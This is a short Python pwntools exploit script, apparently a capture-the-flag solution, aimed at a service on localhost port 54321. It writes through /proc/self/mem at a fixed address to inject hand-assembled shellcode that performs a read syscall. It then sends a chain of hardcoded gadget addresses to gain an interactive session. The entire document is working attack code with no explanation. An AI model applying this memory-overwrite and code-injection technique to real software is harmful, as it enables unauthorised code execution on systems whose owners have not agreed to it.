from pwn import *
context.arch = "amd64"

r = remote("localhost",54321)
r.sendlineafter(":","/proc/self/mem")
r.sendlineafter(":",str(0x4b0f40))
payload = asm("""
push rax
pop rdi
push rsp
pop rsi
push 0x60
pop rdx
syscall
ret
""")
print len(payload)
r.sendlineafter(":",payload.encode("hex"))
r.send(p64(0x0000000000421872)+p64(0x4112af)+p64(0x41f4e0))
r.interactive()

